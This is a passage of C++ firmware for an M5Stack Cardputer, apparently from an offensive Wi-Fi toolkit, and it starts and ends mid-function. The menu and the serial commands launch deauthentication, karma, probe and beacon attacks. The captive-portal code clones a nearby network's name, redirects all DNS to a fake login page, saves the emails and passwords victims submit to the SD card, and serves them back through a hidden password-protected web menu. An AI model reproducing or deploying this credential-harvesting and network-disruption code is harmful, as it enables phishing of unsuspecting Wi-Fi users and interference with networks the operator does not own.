        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
          isKarmaMode = true;
          stopScanKarma();
          currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
        }
        break;

      case StopScanKarma:
        handleMenuInputKarma();
        break;

      case SelectSSIDKarma:
        handleMenuInputKarma();
        break;
    }

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentStateKarma == StartScanKarma) {
      inMenu = true;
      isOperationInProgress = false;
    }
  }
}

void drawMenu() {
  M5.Display.fillRect(0, 13, M5.Display.width(), M5.Display.height() - 13, TFT_BLACK); // Effacer la partie inférieure de l'écran
  M5.Display.setTextSize(1.5); // Assurez-vous que la taille du texte est correcte
  M5.Display.setTextFont(1);

  int lineHeight = 13; // Augmentez la hauteur de ligne si nécessaire
  int startX = 0;
  int startY = 10; // Ajustez pour laisser de la place pour la barre de tâches

  for (int i = 0; i < maxMenuDisplay; i++) {
    int menuIndex = menuStartIndex + i;
    if (menuIndex >= menuSize) break;

    if (menuIndex == currentIndex) {
      M5.Display.fillRect(0, 1 + startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 3); // Ajustez ici
    M5.Display.println(menuItems[menuIndex]);
  }
  M5.Display.display();
}

void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
    case 0:
      scanWifiNetworks();
      break;
    case 1:
      showWifiList();
      break;
    case 2:
      showWifiDetails(currentListIndex);
      break;
    case 3:
      setWifiSSID();
      break;
    case 4:
      setWifiPassword();
      break;
    case 5:
      setMacAddress();
      break;
    case 6:
      createCaptivePortal();
      break;
    case 7:
      stopCaptivePortal();
      break;
    case 8:
      changePortal();
      break;
    case 9:
      checkCredentials();
      break;
    case 10:
      deleteCredentials();
      break;
    case 11:
      displayMonitorPage1();
      break;
    case 12:
      probeAttack();
      break;
    case 13:
      probeSniffing();
      break;
    case 14:
      karmaAttack();
      break;
    case 15:
      startAutoKarma();
      break;
    case 16:
      karmaSpear();
      break;
    case 17:
      listProbes();
      break;
    case 18:
      deleteProbe();
      break;
    case 19:
      deleteAllProbes();
      break;
    case 20:
      showSettingsMenu();
      break;
    case 21:
      wardrivingMode();
      break;
    case 22:
      beaconAttack();
      break;
    case 23:
      deauthAttack(currentListIndex);
      break;
    case 24:
      deauthClients();
      break;
    case 25:
      deauthDetect();
      break;
    case 26:
      checkHandshakes();
      break;
    case 27:
      wallOfFlipper();
      break;
    case 28:
      sendTeslaCode();
      break;
    case 29:
      connectWifi(currentListIndex);
      break;
    case 30:
      sshConnect();
      break;
    case 31:
      scanIpPort();
      break;
    case 32:
      scanHosts();
      break;
    case 33:
      webCrawling();
      break;
    case 34:
      send_pwnagotchi_beacon_main();
      break;
    case 35:
      skimmerDetection();
      break;
    case 36:
      badUSB();
      break;

  }
  isOperationInProgress = false;
}

unsigned long buttonPressTime = 0;
bool buttonPressed = false;

void enterDebounce() {
  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10); // Petit délai pour réduire la charge du processeur
  }
}


void handleMenuInput() {
  static unsigned long lastKeyPressTime = 0;
  const unsigned long keyRepeatDelay = 150; // Délai entre les répétitions d'appui
  static bool keyHandled = false;
  static int previousIndex = -1; // Pour suivre les changements d'index
    enterDebounce();
  M5.update();
  M5Cardputer.update();

  // Variable pour suivre les changements d'état du menu
  bool stateChanged = false;

  if (M5Cardputer.Keyboard.isKeyPressed(';')) {
    if (millis() - lastKeyPressTime > keyRepeatDelay) {
      currentIndex--;
      if (currentIndex < 0) {
        currentIndex = menuSize - 1;  // Boucle à la fin du menu
      }
      lastKeyPressTime = millis();
      stateChanged = true;
    }
    keyHandled = true;
  } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
    if (millis() - lastKeyPressTime > keyRepeatDelay) {
      currentIndex++;
      if (currentIndex >= menuSize) {
        currentIndex = 0;  // Boucle au début du menu
      }
      lastKeyPressTime = millis();
      stateChanged = true;
    }
    keyHandled = true;
  } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    executeMenuItem(currentIndex);
    stateChanged = true;
    keyHandled = true;
  } else {
    // Aucune touche pertinente n'est pressée, réinitialise le drapeau
    keyHandled = false;
  }

  // Réinitialise l'heure de la dernière pression si aucune touche n'est pressée
  if (!keyHandled) {
    lastKeyPressTime = 0;
  }

  // Met à jour l'affichage uniquement si l'état du menu a changé
  if (stateChanged || currentIndex != previousIndex) {
    menuStartIndex = max(0, min(currentIndex, menuSize - maxMenuDisplay));
    drawMenu();
    previousIndex = currentIndex; // Mise à jour de l'index précédent
  }
}


void handleDnsRequestSerial() {
  dnsServer.processNextRequest();
  server.handleClient();
  checkSerialCommands();
}


void listProbesSerial() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    return;
  }

  int probeIndex = 0;
  Serial.println("List of Probes:");
  while (file.available()) {
    String probe = file.readStringUntil('\n');
    probe.trim();
    if (probe.length() > 0) {
      Serial.println(String(probeIndex) + ": " + probe);
      probeIndex++;
    }
  }
  file.close();
}

void selectProbeSerial(int index) {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    return;
  }

  int currentIndex = 0;
  String selectedProbe = "";
  while (file.available()) {
    String probe = file.readStringUntil('\n');
    if (currentIndex == index) {
      selectedProbe = probe;
      break;
    }
    currentIndex++;
  }
  file.close();

  if (selectedProbe.length() > 0) {
    clonedSSID = selectedProbe;
    Serial.println("Probe selected: " + selectedProbe);
  } else {
    Serial.println("Probe index not found.");
  }
}

String currentlySelectedSSID = "";
bool isProbeAttackRunning = false;
bool stopProbeSniffingViaSerial = false;
bool isProbeSniffingRunning = false;

void checkSerialCommands() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command == "scan_wifi") {
      isOperationInProgress = true;
      inMenu = false;
      scanWifiNetworks();
      //sendBLE("-------------------");
      //sendBLE("Near Wifi Network : ");
      for (int i = 0; i < numSsid; i++) {
        ssidList[i] = WiFi.SSID(i);
        //sendBLE(String(i) + ": " + ssidList[i]);
      }
    } else if (command.startsWith("select_network")) {
      int ssidIndex = command.substring(String("select_network ").length()).toInt();
      selectNetwork(ssidIndex);
      //sendBLE("SSID sélectionné: " + currentlySelectedSSID);
    } else if (command.startsWith("change_ssid ")) {
      String newSSID = command.substring(String("change_ssid ").length());
      cloneSSIDForCaptivePortal(newSSID);
      Serial.println("Cloned SSID changed to: " + clonedSSID);
      //sendBLE("Cloned SSID changed to: " + clonedSSID);
    } else if (command.startsWith("set_portal_password ")) {
      String newPassword = command.substring(String("set_portal_password ").length());
      captivePortalPassword = newPassword;
      Serial.println("Captive portal password changed to: " + captivePortalPassword);
      //sendBLE("Captive portal password changed to: " + captivePortalPassword);
    } else if (command.startsWith("set_portal_open")) {
      captivePortalPassword = "";
      Serial.println("Open Captive portal set");
      //sendBLE("Open Captive portal set");
    } else if (command.startsWith("detail_ssid")) {
      int ssidIndex = command.substring(String("detail_ssid ").length()).toInt();
      String security = getWifiSecurity(ssidIndex);
      int32_t rssi = WiFi.RSSI(ssidIndex);
      uint8_t* bssid = WiFi.BSSID(ssidIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.display();
      Serial.println("------Wifi-Info----");
      //sendBLE("------Wifi-Info----");
      Serial.println("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
      //sendBLE("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
      Serial.println("Channel: " + String(WiFi.channel(ssidIndex)));
      //sendBLE("Channel: " + String(WiFi.channel(ssidIndex)));
      Serial.println("Security: " + security);
      //sendBLE("Security: " + security);
      Serial.println("Signal: " + String(rssi) + " dBm");
      //sendBLE("Signal: " + String(rssi) + " dBm");
      Serial.println("MAC: " + macAddress);
      //sendBLE("MAC: " + macAddress);
      Serial.println("-------------------");
      //sendBLE("-------------------");
    } else if (command == "clone_ssid") {
      cloneSSIDForCaptivePortal(currentlySelectedSSID);
      Serial.println("Cloned SSID: " + clonedSSID);
      //sendBLE("Cloned SSID: " + clonedSSID);
    } else if (command == "start_portal") {
      createCaptivePortal();
      //sendBLE("Start portal with " + clonedSSID);
    } else if (command == "stop_portal") {
      stopCaptivePortal();
      //sendBLE("Portal Stopped ");
    } else if (command == "list_portal") {
      File root = SD.open("/sites");
      numPortalFiles = 0;
      Serial.println("Available portals:");
      //sendBLE("-------------------");
      //sendBLE("Availables portals :");
      while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
          String fileName = file.name();
          if (fileName.endsWith(".html")) {
            portalFiles[numPortalFiles] = String("/sites/") + fileName;

            Serial.print(numPortalFiles);
            Serial.print(": ");
            Serial.println(fileName);
            //sendBLE(String(numPortalFiles) + ": " + fileName);
            numPortalFiles++;
            if (numPortalFiles >= 30) break; // max 30 files
          }
        }
        file.close();
      }
      root.close();
    } else if (command.startsWith("change_portal")) {
      int portalIndex = command.substring(String("change_portal ").length()).toInt();
      changePortal(portalIndex);
    } else if (command == "check_credentials") {
      checkCredentialsSerial();
    } else if (command == "monitor_status") {
      String status = getMonitoringStatus();
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println(status);
      //sendBLE(status);
    } else if (command == "probe_attack") {
      isOperationInProgress = true;
      inMenu = false;
      isItSerialCommand = true;
      probeAttack();
      delay(200);
    } else if (command == "stop_probe_attack") {
      if (isProbeAttackRunning) {
        isProbeAttackRunning = false;
        Serial.println("-------------------");
        //sendBLE("-------------------");
        Serial.println("Stopping probe attack...");
        //sendBLE("Stopping probe attack...");
        Serial.println("-------------------");
        //sendBLE("-------------------");
      } else {
        Serial.println("-------------------");
        //sendBLE("-------------------");
        Serial.println("No probe attack running.");
        //sendBLE("No probe attack running.");
        Serial.println("-------------------");
        //sendBLE("-------------------");
      }
    } else if (command == "probe_sniffing") {
      isOperationInProgress = true;
      inMenu = false;
      probeSniffing();
      delay(200);
    } else if (command == "stop_probe_sniffing") {
      stopProbeSniffingViaSerial = true;
      isProbeSniffingRunning = false;
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println("Stopping probe sniffing via serial...");
      //sendBLE("Stopping probe sniffing via serial...");
      Serial.println("-------------------");
      //sendBLE("-------------------");
    } else if (command == "list_probes") {
      listProbesSerial();
    } else if (command.startsWith("select_probes ")) {
      int index = command.substring(String("select_probes ").length()).toInt();
      selectProbeSerial(index);
    } else if (command == "karma_auto") {
      isOperationInProgress = true;
      inMenu = false;
      startAutoKarma();
      delay(200);
    } else if (command == "help") {
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println("Available Commands:");
      //sendBLE("Available Commands:");
      Serial.println("scan_wifi - Scan WiFi Networks");
      //sendBLE("scan_wifi - Scan WiFi Networks");
      Serial.println("select_network <index> - Select WiFi <index>");
      //sendBLE("select_network <index> - Select WiFi <index>");
      Serial.println("change_ssid <max 32 char> - change current SSID");
      //sendBLE("change_ssid <max 32 char> - change current SSID");
      Serial.println("set_portal_password <password min 8> - change portal password");
      //sendBLE("set_portal_password <password min 8> - portal pass");
      Serial.println("set_portal_open  - change portal to open");
      //sendBLE("set_portal_open - change portal to open");
      Serial.println("detail_ssid <index> - Details of WiFi <index>");
      //sendBLE("detail_ssid <index> - Details of WiFi <index>");
      Serial.println("clone_ssid - Clone Network SSID");
      //sendBLE("clone_ssid - Clone Network SSID");
      Serial.println("start_portal - Activate Captive Portal");
      //sendBLE("start_portal - Activate Captive Portal");
      Serial.println("stop_portal - Deactivate Portal");
      //sendBLE("stop_portal - Deactivate Portal");
      Serial.println("list_portal - Show Portal List");
      //sendBLE("list_portal - Show Portal List");
      Serial.println("change_portal <index> - Switch Portal <index>");
      //sendBLE("change_portal <index> - Switch Portal <index>");
      Serial.println("check_credentials - Check Saved Credentials");
      //sendBLE("check_credentials - Check Saved Credentials");
      Serial.println("monitor_status - Get current information on device");
      //sendBLE("monitor_status - Get current information on device");
      Serial.println("probe_attack - Initiate Probe Attack");
      Serial.println("stop_probe_attack - End Probe Attack");
      Serial.println("probe_sniffing - Begin Probe Sniffing");
      Serial.println("stop_probe_sniffing - End Probe Sniffing");
      Serial.println("list_probes - Show Probes");
      //sendBLE("list_probes - Show Probes");
      Serial.println("select_probes <index> - Choose Probe <index>");
      //sendBLE("select_probes <index> - Choose Probe <index>");
      Serial.println("karma_auto - Auto Karma Attack Mode");
      Serial.println("-------------------");
      //sendBLE("-------------------");
    } else {
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println("Command not recognized: " + command);
      //sendBLE("Command not recognized: " + command);
      Serial.println("-------------------");
      //sendBLE("-------------------");
    }
  }
}

String getMonitoringStatus() {
  String status;
  int numClientsConnected = WiFi.softAPgetStationNum();
  int numCredentials = countPasswordsInFile();

  status += "Clients: " + String(numClientsConnected) + "\n";
  status += "Credentials: " + String(numCredentials) + "\n";
  status += "SSID: " + String(clonedSSID) + "\n";
  status += "Portal: " + String(isCaptivePortalOn ? "On" : "Off") + "\n";
  status += "Page: " + String(selectedPortalFile.substring(7)) + "\n";
  updateConnectedMACs();
  status += "Connected MACs:\n";
  for (int i = 0; i < 10; i++) {
    if (macAddresses[i] != "") {
      status += macAddresses[i] + "\n";
    }
  }
  status += "Stack left: " + getStack() + " Kb\n";
  status += "RAM: " + getRamUsage() + " Mo\n";
  status += "Battery: " + getBatteryLevel() + "%\n"; // thx to kdv88 to pointing mistranlastion
  status += "Temperature: " + getTemperature() + "C\n";
  return status;
}

void checkCredentialsSerial() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Failed to open credentials file");
    return;
  }
  bool isEmpty = true;
  Serial.println("----------------------");
  Serial.println("Credentials Found:");
  Serial.println("----------------------");
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.length() > 0) {
      Serial.println(line);
      isEmpty = false;
    }
  }
  file.close();
  if (isEmpty) {
    Serial.println("No credentials found.");
  }
}

void changePortal(int index) {
  File root = SD.open("/sites");
  int currentIndex = 0;
  String selectedFile;
  while (File file = root.openNextFile()) {
    if (currentIndex == index) {
      selectedFile = String(file.name());
      break;
    }
    currentIndex++;
    file.close();
  }
  root.close();
  if (selectedFile.length() > 0) {
    Serial.println("Changing portal to: " + selectedFile);
    selectedPortalFile = "/sites/" + selectedFile;
  } else {
    Serial.println("Invalid portal index");
  }
}

void selectNetwork(int index) {
  if (index >= 0 && index < numSsid) {
    currentlySelectedSSID = ssidList[index];
    Serial.println("SSID sélectionné: " + currentlySelectedSSID);
  } else {
    Serial.println("Index SSID invalide.");
  }
}

void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
    M5.Display.setCursor(12 , M5.Display.height() / 2 );
    M5.Display.print("Scan in progress... ");
    Serial.println("-------------------");
    Serial.println("WiFi Scan in progress... ");
    M5.Display.display();
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  Serial.println("-------------------");
  Serial.println("Near Wifi Network : ");
  numSsid = min(n, 100);
  for (int i = 0; i < numSsid; i++) {
    ssidList[i] = WiFi.SSID(i);
    Serial.print(i);
    Serial.print(": ");
    Serial.println(ssidList[i]);
  }
  Serial.println("-------------------");
  Serial.println("WiFi Scan Completed ");
  Serial.println("-------------------");
  waitAndReturnToMenu("Scan Completed");

}

void showWifiList() {
  bool needsDisplayUpdate = true;  // Flag pour déterminer si l'affichage doit être mis à jour
  enterDebounce();
  static bool keyHandled = false;
  while (!inMenu) {
    if (needsDisplayUpdate) {
      M5.Display.clear();
      const int listDisplayLimit = M5.Display.height() / 13; // Ajuster en fonction de la nouvelle taille du texte
      int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));

      M5.Display.setTextSize(1.5);
      for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
        if (i == currentListIndex) {
          M5.Display.fillRect(0, (i - listStartIndex) * 13, M5.Display.width(), 13, TFT_NAVY); // Ajuster la hauteur
          M5.Display.setTextColor(TFT_GREEN);
        } else {
          M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(2, (i - listStartIndex) * 13); // Ajuster la hauteur
        M5.Display.println(ssidList[i]);
      }
      M5.Display.display();
      needsDisplayUpdate = false;  // Réinitialiser le flag après la mise à jour de l'affichage
    }

    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();
    delay(10); // Petit délai pour réduire la charge du processeur

    // Vérifiez les entrées clavier ici
    if ((M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) || (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled)) {
      if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        currentListIndex--;
        if (currentListIndex < 0) currentListIndex = numSsid - 1;
      } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        currentListIndex++;
        if (currentListIndex >= numSsid) currentListIndex = 0;
      }
      needsDisplayUpdate = true;  // Marquer pour mise à jour de l'affichage
      keyHandled = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
      inMenu = true;
      Serial.println("-------------------");
      Serial.println("SSID " + ssidList[currentListIndex] + " selected");
      Serial.println("-------------------");
      waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
      needsDisplayUpdate = true;  // Marquer pour mise à jour de l'affichage
      keyHandled = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      inMenu = true;
      drawMenu();
      break;
    } else if (!M5Cardputer.Keyboard.isKeyPressed(';') &&
               !M5Cardputer.Keyboard.isKeyPressed('.') &&
               !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      keyHandled = false;
    }
  }
}



void showWifiDetails(int networkIndex) {
  inMenu = false;
  bool keyHandled = false;  // Pour gérer la réponse à la touche une fois

  auto updateDisplay = [&]() {
    if (networkIndex >= 0 && networkIndex < numSsid) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);
      int y = 2;
      int x = 0;

      // SSID
      M5.Display.setCursor(x, y);
      M5.Display.println("SSID:" + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
      y += 20;

      // Channel
      int channel = WiFi.channel(networkIndex);
      M5.Display.setCursor(x, y);
      M5.Display.println("Channel:" + (channel > 0 ? String(channel) : "N/A"));
      y += 16;

      // Security
      String security = getWifiSecurity(networkIndex);
      M5.Display.setCursor(x, y);
      M5.Display.println("Security:" + (security.length() > 0 ? security : "N/A"));
      y += 16;

      // Signal Strength
      int32_t rssi = WiFi.RSSI(networkIndex);
      M5.Display.setCursor(x, y);
      M5.Display.println("Signal:" + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
      y += 16;

      // MAC Address
      uint8_t* bssid = WiFi.BSSID(networkIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.setCursor(x, y);
      M5.Display.println("MAC:" + (macAddress.length() > 0 ? macAddress : "N/A"));
      y += 16;

      M5.Display.setCursor(80, 110);
      M5.Display.println("ENTER:Clone");
      M5.Display.setCursor(20, 110);
      M5.Display.println("<");
      M5.Display.setCursor(M5.Display.width() - 20 , 110);
      M5.Display.println(">");

      M5.Display.display();
    }
  };

  updateDisplay();

  enterDebounce();
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires

  while (!inMenu) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        cloneSSIDForCaptivePortal(ssidList[networkIndex]);
        inMenu = true;
        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
        drawMenu();
        break; // Sortir de la boucle
      } else if (M5Cardputer.Keyboard.isKeyPressed('/') && !keyHandled) {
        networkIndex = (networkIndex + 1) % numSsid;
        updateDisplay();
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) && !keyHandled) {
        inMenu = true;
        drawMenu();
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(',') && !keyHandled) {
        networkIndex = (networkIndex - 1 + numSsid) % numSsid;
        updateDisplay();
        lastKeyPressTime = millis();
      }

      if (!M5Cardputer.Keyboard.isKeyPressed('/') &&
          !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) &&
          !M5Cardputer.Keyboard.isKeyPressed(',') &&
          !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }
  }
}



String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

void createCaptivePortal() {
  String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
  WiFi.mode(WIFI_MODE_APSTA);
  if (!isAutoKarmaActive) {
    if (captivePortalPassword == "") {
      WiFi.softAP(clonedSSID.c_str());
    } else {
      WiFi.softAP(clonedSSID.c_str(), captivePortalPassword.c_str());
    }

  }

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  isCaptivePortalOn = true;
  server.on("/", HTTP_GET, []() {
    String email = server.arg("email");
    String password = server.arg("password");
    if (!email.isEmpty() && !password.isEmpty()) {
      saveCredentials(email, password, selectedPortalFile.substring(7), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
      server.send(200, "text/plain", "Credentials Saved");
    } else {
      Serial.println("-------------------");
      Serial.println("Direct Web Access !!!");
      Serial.println("-------------------");
      servePortalFile(selectedPortalFile);
    }
  });



  server.on("/evil-m5core2-menu", HTTP_GET, []() {
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
    html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
    html += " input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
    html += " a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
    html += "</style></head><body>";
    html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
    html += "Password: <input type='password' name='pass'><br>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SD File</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/Change-Portal-Password?pass=\"+document.getElementsByName(\"pass\")[0].value'>Change WPA Password</a>";
    html += "</form></div></body></html>";
    server.send(200, "text/html", html);
    Serial.println("-------------------");
    Serial.println("evil-m5core2-menu access.");
    Serial.println("-------------------");
  });

  server.on("/credentials", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password == accessWebPassword) {
      File file = SD.open("/credentials.txt");
      if (file) {
        if (file.size() == 0) {
          server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        } else {
          server.streamFile(file, "text/plain");
        }
        file.close();
      } else {
        server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      }
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    }
  });


  server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
  server.on("/download-sd-file", HTTP_GET, handleFileDownload);
  server.on("/download-all-files", HTTP_GET, handleDownloadAllFiles);
  server.on("/list-directories", HTTP_GET, handleListDirectories);

  server.on("/uploadhtmlfile", HTTP_GET, []() {
    if (server.arg("pass") == accessWebPassword) {
      String password = server.arg("pass");
      String html = "<!DOCTYPE html><html><head>";
      html += "<meta charset='UTF-8'>";
      html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
      html += "<title>Upload File</title></head>";
      html += "<body><div class='container'>";
      html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
      html += "<input type='file' name='file' accept='*/*'>";
      html += "Select directory: <select id='dirSelect' name='directory'>";
      html += "<option value='/'>/</option>";
      html += "</select><br>";
      html += "<input type='submit' value='Upload file'>";
      html += "</form>";
      html += "<script>";
      html += "window.onload = function() {";
      html += "    var passValue = '" + password + "';";
      html += "    var dirSelect = document.getElementById('dirSelect');";
      html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
      html += "        .then(response => response.text())";
      html += "        .then(data => {";
      html += "            const dirs = data.split('\\n');";
      html += "            dirs.forEach(dir => {";
      html += "                if (dir.trim() !== '') {";
      html += "                    var option = document.createElement('option');";
      html += "                    option.value = dir;";
      html += "                    option.textContent = dir;";
      html += "                    dirSelect.appendChild(option);";
      html += "                }";
      html += "            });";
      html += "        })";
      html += "        .catch(error => console.error('Error:', error));";
      html += "    var form = document.getElementById('uploadForm');";
      html += "    form.onsubmit = function(event) {";
      html += "        event.preventDefault();";
      html += "        var directory = dirSelect.value;";
      html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
      html += "        form.submit();";
      html += "    };";
      html += "};";
      html += "</script>";
      html += "<style>";
      html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
      html += "</style></body></html>";

      server.send(200, "text/html", html);
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    }
  });



  server.on("/upload", HTTP_POST, []() {
    server.send(200);
  }, handleFileUpload);

  server.on("/delete-sd-file", HTTP_GET, handleFileDelete);

  server.on("/Change-Portal-Password", HTTP_GET, handleChangePassword);


  server.onNotFound([]() {
    pageAccessFlag = true;
    Serial.println("-------------------");
    Serial.println("Portal Web Access !!!");
    Serial.println("-------------------");
    servePortalFile(selectedPortalFile);
  });

  server.begin();
  Serial.println("-------------------");
  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
  Serial.println("-------------------");
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.show();
    delay(250);
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
  }
  if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
    waitAndReturnToMenu("Portal " + ssid + " Deployed");
  }
}


String getDirectoryHtml(File dir, String path, String password) {
  String html = "<!DOCTYPE html><html><head><style>";
  html += "body{font-family:sans-serif;background:#f0f0f0;padding:20px}";
  html += "ul{list-style-type:none;padding:0}";
  html += "li{margin:10px 0;padding:5px;background:white;border:1px solid #ddd;border-radius:5px}";
  html += "a{color:#007bff;text-decoration:none}";
  html += "a:hover{color:#0056b3}";
  html += ".red{color:red}";
  html += "</style></head>";

  html += "<p><a href='/download-all-files?dir=" + path + "&pass=" + password + "'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Download All</button></a></p>";

  html += "<body><ul>";
  if (path != "/") {
    String parentPath = path.substring(0, path.lastIndexOf('/'));
    if (parentPath == "") parentPath = "/";
    html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
  }

  while (File file = dir.openNextFile()) {
    String fileName = String(file.name());
    String displayFileName = fileName;
    if (path != "/" && fileName.startsWith(path)) {
      displayFileName = fileName.substring(path.length());
      if (displayFileName.startsWith("/")) {
        displayFileName = displayFileName.substring(1);
      }
    }

    String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
    if (!fullPath.startsWith("/")) {
      fullPath = "/" + fullPath;
    }

